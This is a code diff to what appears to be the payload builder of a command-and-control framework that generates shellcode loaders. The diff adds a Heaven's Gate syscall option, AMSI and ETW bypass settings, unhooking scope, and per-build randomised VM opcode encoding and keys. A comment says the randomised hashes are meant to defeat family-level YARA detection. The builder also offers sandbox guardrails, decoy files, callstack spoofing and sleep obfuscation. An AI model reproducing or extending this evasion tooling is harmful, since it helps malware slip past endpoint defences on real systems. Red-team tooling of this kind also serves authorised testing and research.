@@ -188,10 +188,6 @@ ENCODING_TYPE_MAP = {
     "WORDS256": 4,
 }
 
-#
-# Commented out to reduce confusion
-# uncomment the ones that you will use on your custom loader
-#
 SHELLCODE_FORMAT = {
     "C"          : "c",
     "CSharp"     : "csharp",
@@ -1109,10 +1105,13 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Syscall dispatch layer for Nt* calls.\n"
-                "TartarusGate: built-in indirect syscall shim page.\n"
-                "SysWhispers3: generated Sw3Nt* stubs."
+                "TartarusGate: built-in indirect syscall shim page (x64).\n"
+                "SysWhispers3: generated Sw3Nt* stubs (x64).\n"
+                "Heaven's Gate: 32-bit WoW64 far-call to CS:0x33 + native syscall. "
+                "Requires Loader Architecture = x86. Issues 64-bit syscalls from a "
+                "32-bit process without patching any DLL."
             ),
-            choices = ["TartarusGate", "SysWhispers3"],
+            choices = ["TartarusGate", "SysWhispers3", "Heaven's Gate"],
             default_value = "TartarusGate",
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
@@ -4555,7 +4554,7 @@ generated if none have been entered.""",
                             guardrails_check_sandbox=guardrails_check_sandbox,
                             guardrails_decoy_file="decoy.pdf" if self.get_parameter("0.13 Decoy File Inclusion") else "",
                             gr_block=gr_block,
-                            syscall_backend=(1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0),
+                            syscall_backend={"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0),
                             callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
                             callstack_spoof_modules=(
                                 parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
@@ -4752,7 +4751,7 @@ generated if none have been entered.""",
                         guardrails_check_sandbox=0,
                         guardrails_decoy_file="",
                         gr_block=gr_block_hijack,
-                        syscall_backend=(1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0),
+                        syscall_backend={"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0),
                         callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
                         callstack_spoof_modules=(
                             parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
@@ -4781,7 +4780,7 @@ generated if none have been entered.""",
                 # loader has unique hash values for GetProcAddress targets.
                 # Defeats family-level YARA pinned on fixed hash constants.
                 _hash_seed = f"0x{secrets.randbits(32):08X}"
-                _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
+                _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                 _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                 cmd = [
                     "make",
@@ -4854,7 +4853,7 @@ generated if none have been entered.""",
                     else:
                         loader_format = self.get_parameter('0.2 Loader Format')
                         _hash_seed = f"0x{secrets.randbits(32):08X}"
-                        _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
+                        _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                         _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                         _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
                             self.get_parameter("0.5p Sleep Obfuscation"), 0)
@@ -4916,13 +4915,52 @@ generated if none have been entered.""",
                     loader_format = self.get_parameter('0.2 Loader Format')
                     build_config = self.get_parameter('0.3 Loader Build Configuration')
                     _hash_seed = f"0x{secrets.randbits(32):08X}"
-                    _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
+                    _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                     _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
                         self.get_parameter("0.5p Sleep Obfuscation"), 0)
                     inj = self.get_parameter('0.4a VM Loader - Injection Type') or "2"
+                    _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
+                    _etw     = int(self.get_parameter("0.5t ETW Bypass Type") or 0)
+                    _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 0)
+                    _so_base = int(self.get_parameter("0.5q Sleep Base MS") or 5000)
+                    _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)
+
+                    # Per-build randomised VM parameters.
+                    # VM_IR_SEED: 32-bit XOR key derivation seed.
+                    # VM_FWD_*: random permutation of [0..7] for opcode encoding.
+                    # VM_KEY_BASE_*: random 6-byte key derivation base.
+                    # All values passed to BOTH the embedded build step and the
+                    # final compile so vmloader_builder.cpp and vmloader.hpp use
+                    # identical parameters — seed mismatch = corrupted payload.
+                    _vm_seed  = f"0x{secrets.randbits(32):08X}U"
+                    import random as _rnd
+                    _vm_fwd   = list(range(8))
+                    _rnd.shuffle(_vm_fwd)
+                    _vm_key   = [secrets.randbits(8) for _ in range(6)]
+
+                    _vm_random_args = [
+                        f"VM_IR_SEED={_vm_seed}",
+                        f"VM_FWD_0={_vm_fwd[0]}",
+                        f"VM_FWD_1={_vm_fwd[1]}",
+                        f"VM_FWD_2={_vm_fwd[2]}",
+                        f"VM_FWD_3={_vm_fwd[3]}",
+                        f"VM_FWD_4={_vm_fwd[4]}",
+                        f"VM_FWD_5={_vm_fwd[5]}",
+                        f"VM_FWD_6={_vm_fwd[6]}",
+                        f"VM_FWD_7={_vm_fwd[7]}",
+                        f"VM_KEY_BASE_0={hex(_vm_key[0])}",
+                        f"VM_KEY_BASE_1={hex(_vm_key[1])}",
+                        f"VM_KEY_BASE_2={hex(_vm_key[2])}",
+                        f"VM_KEY_BASE_3={hex(_vm_key[3])}",
+                        f"VM_KEY_BASE_4={hex(_vm_key[4])}",
+                        f"VM_KEY_BASE_5={hex(_vm_key[5])}",
+                        f"VM_SLEEP_BASE_MS={_so_base}",
+                        f"VM_SLEEP_JITTER_MS={_so_jitt}",
+                    ]
 
                     embedded_proc = await asyncio.create_subprocess_exec(
                         "make", "-C", vmloader_path, "embedded",
+                        *_vm_random_args,
                         stdout=asyncio.subprocess.PIPE,
                         stderr=asyncio.subprocess.PIPE,
                     )
@@ -4949,6 +4987,10 @@ generated if none have been entered.""",
                         f"EREBUS_HASH_SEED={_hash_seed}",
                         f"CONFIG_SYSCALL_BACKEND={_sw3}",
                         f"CONFIG_SLEEP_OBFUSCATION_TYPE={_so_type}",
+                        f"CONFIG_AMSI_BYPASS_TYPE={_amsi}",
+                        f"CONFIG_ETW_BYPASS_TYPE={_etw}",
+                        f"CONFIG_UNHOOK_SCOPE={_unhook}",
+                        *_vm_random_args,
                         "all"
                     ]
                     if loader_format == "dll":
